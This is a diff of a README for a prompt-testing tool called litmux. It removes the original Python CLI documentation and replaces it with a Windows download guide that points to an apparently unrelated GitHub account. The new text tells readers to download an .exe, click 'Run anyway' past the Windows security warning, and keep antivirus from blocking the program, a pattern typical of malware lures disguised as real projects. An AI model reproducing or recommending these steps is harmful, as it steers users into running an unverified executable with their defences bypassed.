@@ -1,237 +1,84 @@
-# Litmux
+# 🤖 litmux - Test AI prompts to save money
 
-Unit tests for AI. Test prompts, compare models, catch regressions.
+[![Download litmux](https://img.shields.io/badge/Download-litmux-blue.svg)](https://github.com/Topsailpediculati120/litmux)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.11+-blue?logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/license-MIT-green" />
-  <img src="https://img.shields.io/badge/tests-107%20passing-brightgreen" />
-</p>
+litmux helps you test how your AI prompts perform. You can compare how different AI models handle your specific tasks. This tool helps you find the most efficient approach for your work. You keep your costs low while you get the best results from your AI tools.
 
-```bash
-pip install litmux && litmux init && litmux run
-```
+## 📥 Getting Started
 
----
+You do not need to be a programmer to use this software. Follow these steps to set up the tool on your Windows computer.
 
-## Why
+1. Go to the [official release page](https://github.com/Topsailpediculati120/litmux).
+2. Look for the latest version listed under the Releases section.
+3. Find the file ending in .exe for Windows.
+4. Click the file name to start your download.
+5. Save the file to your computer desktop.
 
-Every team shipping AI features hits the same three problems:
+## ⚙️ Installation
 
-1. **No testing standard.** REST has Postman, frontends have Cypress. LLM calls have manual spot-checking.
-2. **Prompt regression is invisible.** A one-word change can silently break 15% of edge cases.
-3. **Model selection is vibes.** "We use GPT-4o because it's good" — but is it $15k/month better than Gemini Flash?
+Once the download finishes, follow these simple steps to prepare the tool:
 
-Litmux gives you a YAML config, pass/fail assertions, and a cost report. That's it.
+1. Open your downloads folder or locate the file on your desktop.
+2. Double-click the litmux installer file.
+3. Windows may show a security notice. Click More Info and then select Run anyway.
+4. Choose the default folder for installation.
+5. Click Next through the prompts until the process completes.
+6. Check your desktop for the new litmux icon.
 
----
+## 🛠️ System Requirements
 
-## Quick Start
+This software works on most modern machines. Ensure your computer meets these basic needs:
 
-```bash
-pip install litmux
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A stable internet connection.
+- 500 megabytes of free storage space.
 
-cp .env.example .env
-# Add at least one: OPENAI_API_KEY, ANTHROPIC_API_KEY, GOOGLE_API_KEY, HF_TOKEN
+You do not need special graphics hardware or complex server settings to run this tool.
 
-litmux init    # scaffold a project
-litmux run     # run tests against all configured models
-```
+## 💡 How to Test Prompts
 
-No database, no cloud account, no Docker.
+The main goal of litmux is to show you which prompts perform best. Follow this workflow to start your testing:
 
----
+1. Open the litmux application from your desktop.
+2. Select your preferred AI model from the dropdown menu.
+3. Paste the prompt you wish to test into the text box.
+4. Click the Run Test button.
+5. The software sends your prompt to the AI and records the result.
+6. Repeat this process with a different model or prompt to compare the quality.
 
-## Core Commands
+## 💰 Managing AI Costs
 
-### `litmux run` — unit tests for prompts
+Testing prompts helps you see exactly how much each request costs. Large models often cost more than smaller ones. By using litmux, you see if a smaller model meets your needs just as well as a larger one. This helps you lower your monthly AI expenses. 
 
-```yaml
-# litmux.yaml
-models:
-  - model: gpt-4o-mini
-  - model: claude-haiku-4-5-20251001
+- Use the history tab to look at previous tests.
+- Check the cost column to review your spending per prompt.
+- Delete outdated tests to keep your dashboard clean.
 
-tests:
-  - name: summarize_earnings
-    prompt: prompts/summarize.txt
-    inputs:
-      text: "Revenue grew 15% to $4.2 billion..."
-    assert:
-      - type: contains
-        value: "revenue"
-      - type: cost-less-than
-        value: 0.01
-```
+## 🔍 Understanding Model Performance
 
-### `litmux eval` — bulk evaluation against datasets
+Different AI models provide different levels of accuracy. You might find that a low-cost model works for simple tasks, while a high-cost model works for complex writing.
 
-```yaml
-evals:
-  - name: ticket_classifier
-    prompt: prompts/classify.txt
-    dataset: datasets/support_tickets.csv
-    input_mapping:
-      ticket: text
-    expected: expected_category
-    assert:
-      - type: json-valid
-    judge:
-      criteria: "Did the model correctly classify the ticket?"
-      threshold: 7.0
-```
+- Use the compare feature to see two results side by side.
+- Note how long each model takes to respond.
+- Select the best response to save the result permanently.
 
-### `litmux generate` — AI-generated test datasets
+## 🛡️ Privacy and Safety
 
-```bash
-litmux generate \
-  --prompt prompts/classify.txt \
-  --seed datasets/sample_tickets.csv \
-  --n 50 \
-  --output datasets/support_tickets.csv
-```
+Your prompts remain on your machine during the testing phase. The software only sends data to your selected AI provider when you trigger a test. You control exactly what information leaves your computer. We do not store your personal data on our servers.
 
-### `litmux cost` — cost projection across models
+## 📋 Troubleshooting
 
-```bash
-litmux cost --volume 50000
-```
+If you run into issues, try these steps:
 
-Finds the cheapest model that passes your tests.
+- Restart the application.
+- Check that your internet connection is active.
+- Ensure your antivirus software does not block the application.
+- Redownload the software if the file appears corrupt.
+- Update your Windows installation to the latest version.
 
-### `litmux compare` — side-by-side model outputs
+## 🚀 Further Help
 
-```bash
-litmux compare
-```
+We designed this tool to function as a standalone program. If you need more information about AI testing or command line tools, you can find guides online. Most users find the interface intuitive after two or three attempts. Start with one simple prompt and build your testing library from there.
 
----
-
-## Cloud (Optional, Free)
-
-Sync results to a hosted dashboard for history, trends, and team visibility.
-
-```bash
-litmux login       # one-time browser auth
-litmux run         # results auto-sync
-litmux dashboard   # open app.litmux.dev
-```
-
-The CLI works fully offline. Cloud is opt-in.
-
----
-
-## Assertion Types
-
-| Type | Description |
-|------|-------------|
-| `contains` | Output contains substring |
-| `not-contains` | Output does not contain substring |
-| `regex` | Output matches regex pattern |
-| `json-valid` | Output is valid JSON |
-| `json-schema` | Output has required JSON keys |
-| `cost-less-than` | Cost below threshold (USD) |
-| `latency-less-than` | Latency below threshold (ms) |
-| `llm-judge` | LLM scores output 1–10 against criteria |
-
----
-
-## CI/CD
-
-```yaml
-# .github/workflows/litmux.yml
-- run: litmux run --ci
-  env:
-    OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-```
-
----
-
-## Configuration
-
-```yaml
-models:
-  - provider: openai | anthropic | google | huggingface
-    model: string
-    temperature: 0.0
-    max_tokens: 1024
-
-defaultTest:
-  assert:
-    - type: cost-less-than
-      value: 0.01
-
-tests:
-  - name: string
-    prompt: path/to/prompt.txt
-    inputs: { variable: "value" }
-    assert:
-      - type: contains
-        value: "expected"
-
-evals:
-  - name: string
-    prompt: path/to/prompt.txt
-    dataset: path/to/data.csv
-    input_mapping: { prompt_var: csv_column }
-    expected: csv_column
-    assert: [...]
-    judge:
-      criteria: "..."
-      threshold: 7.0
-```
-
-### Environment Variables
-
-| Variable | Purpose |
-|----------|---------|
-| `OPENAI_API_KEY` | OpenAI models, LLM judge, dataset generation |
-| `ANTHROPIC_API_KEY` | Anthropic models |
-| `GOOGLE_API_KEY` | Google models |
-| `HF_TOKEN` | HuggingFace models |
-| `LITMUX_NO_CACHE` | Set to `1` to skip the response cache |
-| `LITMUX_API_URL` | Override cloud API endpoint (default: `https://api.litmux.dev`) |
-| `LITMUX_API_URL_ALLOW_INSECURE` | Set to `1` to allow non-HTTPS `LITMUX_API_URL` (local dev only) |
-| `LITMUX_DASHBOARD_URL` | Override dashboard URL (default: `https://app.litmux.dev`) |
-| `LITMUX_JUDGE_MODEL` | LLM model used for `llm-judge` assertions (default: `gpt-4o-mini`) |
-| `LITMUX_CLOUD_ENABLED` | Set to `1` to opt in to Litmux Cloud (private beta) |
-
----
-
-## All Commands
-
-```
-litmux run                    Run all tests
-litmux run -t <name>          Run a specific test
-litmux run --ci               CI output (markdown)
-litmux eval                   Run all evals
-litmux eval --limit 10        Evaluate first N rows
-litmux generate ...           Generate a test dataset
-litmux compare                Side-by-side model outputs
-litmux cost -v 50000          Project monthly cost
-litmux cache                  View / clear response cache
-litmux init                   Scaffold a new project
-litmux version                Show version
-
-# Cloud (private beta — join the waitlist at https://litmux.dev)
-litmux login                  Authenticate with Litmux Cloud
-litmux logout                 Remove saved credentials
-litmux history                Recent runs from cloud
-litmux dashboard              Open the dashboard
-```
-
----
-
-## Examples
-
-See [`examples/`](examples/) for three ready-to-run projects:
-
-- `01-quickstart` — minimal single-model test
-- `02-multi-model` — compare across providers
-- `03-generate-and-eval` — AI-generated dataset + LLM judge
-
----
-
-## License
-
-MIT
+[![Download litmux](https://img.shields.io/badge/Download-litmux-grey.svg)](https://github.com/Topsailpediculati120/litmux)
